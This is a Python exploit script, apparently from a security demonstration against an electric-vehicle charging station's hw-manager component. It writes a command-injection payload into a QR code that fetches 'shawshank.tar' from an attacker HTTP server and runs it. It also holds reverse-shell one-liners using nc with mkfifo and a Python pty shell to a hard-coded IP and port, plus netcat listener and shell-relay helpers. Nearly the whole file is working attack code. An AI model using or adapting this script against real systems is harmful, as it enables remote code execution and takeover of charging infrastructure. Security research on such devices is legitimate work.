# Read configuration from the environment variables

# Start the http service to serve the malicious files

# Generate QR Code that contains a malicious payload for the command injection vulnerability 
# This will download the malicious files from the http server the attacker and execute it on the hw-manager component of the charging station when 


import http.server
import socketserver
import threading
import os
import time
import qrcode
import base64
import subprocess
import sys
import socket
from sys import argv
from PIL import Image


ATTACKER_IP = os.environ["ATTACKER_IP"]
ATTACKER_PACKAGE = os.environ["PACKAGE"]
DIRECTORY = os.environ["ATTACKER_HTTP_SERVER_DIR"]
ATTACKER_HTTP_SERVER_PORT = os.environ["ATTACKER_HTTP_SERVER_PORT"]
ATTACKER_STAGE2_PORT = os.environ["ATTACKER_STAGE2_PORT"]


# Define a simple request handler that serves files from the specified directory
class MyRequestHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, directory=None, **kwargs):
        super().__init__(*args, directory=directory, **kwargs)


def start_http_server(port, directory):
    os.chdir(directory)  # Change to the specified directory
    with socketserver.TCPServer(("0.0.0.0", int(port)), MyRequestHandler) as httpd:
        print(f"Serving at port {port} from directory: {directory}")
        httpd.serve_forever()


def start_netcat_listener(port):
    print(f"Listening for incoming connections on port {port}...")
    nc_process = subprocess.Popen(["nc", "-lvnp", str(port)], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=True)
    return nc_process


# Function to send commands to the netcat process
def send_commands_to_nc(nc_process):
    try:
        while True:
            command = input("Enter command to send to netcat (or type 'exit' to quit): ")
            if command.lower() == 'exit':
                break
            nc_process.stdin.write(command + '\n')
            nc_process.stdin.flush()
            time.sleep(1)  # Give some time for the command to execute
            while True:
                output = nc_process.stdout.readline()
                if output:
                    print(f'Output from netcat: {output.strip()}')
                else:
                    break
    except Exception as e:
        print(f"Error: {e}")
    finally:
        nc_process.terminate()


# Function to spawn a new shell using netcat
def spawn_shell(nc_process):
    print("Spawning a new shell...")
    shell_process = subprocess.Popen(["/bin/bash"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    try:
        while True:
            output = shell_process.stdout.readline()
            if output:
                nc_process.stdin.write(output)
                nc_process.stdin.flush()
            command = input("Shell> ")
            if command.lower() == 'exit':
                break
            shell_process.stdin.write(command + '\n')
            shell_process.stdin.flush()
    finally:
        shell_process.terminate()


def generate_qr_code(data, box_size=10, border=4):
    print("Generating QR Code with the Stage 1 Payload")
    print(data)
    qr = qrcode.QRCode(version=1, box_size=box_size, border=border)
    qr.add_data(data)
    qr.make(fit=True)
    qr.print_ascii()
    # Optional 
    img = qr.make_image(fill_color="black", back_color="white")
    img.save("qrpayload.png")


def handle_client(client_socket):
    """Handles communication with a connected client."""
    with client_socket:
        print("Client connected:", client_socket.getpeername())
        while True:
            try:
                # Receive data from the client
                request = client_socket.recv(1024).decode('utf-8')
                if not request:
                    break  # Connection closed by client
                print(f"Received: {request}")

                # Echo the received message back to the client
                client_socket.sendall(f"Echo: {request}".encode('utf-8'))
            except Exception as e:
                print(f"Error: {e}")
                break

    print("Client disconnected:", client_socket.getpeername())


def start_server():
    """Starts the TCP server."""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('', int(ATTACKER_STAGE2_PORT)))
    server.listen(5)  # Listen for incoming connections
    print(f"Server listening on port {ATTACKER_STAGE2_PORT}...")

    try:
        while True:
            client_socket, addr = server.accept()  # Accept a new connection
            client_handler = threading.Thread(target=handle_client, args=(client_socket,))
            client_handler.start()  # Start a new thread to handle the client
    except KeyboardInterrupt:
        print("Shutting down the server.")
    finally:
        server.close()


def pre_stage(cheri_on):

    # Start the HTTP server in a separate thread
    server_thread = threading.Thread(target=start_http_server, args=(ATTACKER_HTTP_SERVER_PORT, DIRECTORY))
    server_thread.daemon = False
    server_thread.start()

    f = open("payload_url.txt")
    # payload_text = b"ACME;  nohup rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.101 8889 >/tmp/f >/dev/null 2>&1 &"
    payload_text = b"ACME; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.102\",8889));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")' &"
    
    prestage_url = ATTACKER_IP + ":" + ATTACKER_HTTP_SERVER_PORT + "/shawshank.tar"
    payload_text = "ACME; curl -O -J "+ prestage_url + " ;tar -xf shawshank.tar;python3 shawshank.py " + cheri_on
    payload_text = payload_text.encode("utf-8")
    payload_text_b64 = base64.urlsafe_b64encode(payload_text).decode('utf-8')
    payload = f.read()
    f.close()
    generate_qr_code(payload+payload_text_b64)
    return server_thread


if __name__ == "__main__":

    if len(argv) == 2:
        try:
            cheri_on = str(argv[1])
            server_thread = pre_stage(cheri_on)
            #start_server()
            #nc_process = start_netcat_listener(ATTACKER_STAGE2_PORT)

        except KeyboardInterrupt:
            #nc_process.terminate()
            server_thread.join()
            print("Shutting down the main program.")
    else:
        print("Wrong parameters")
        print(argv)
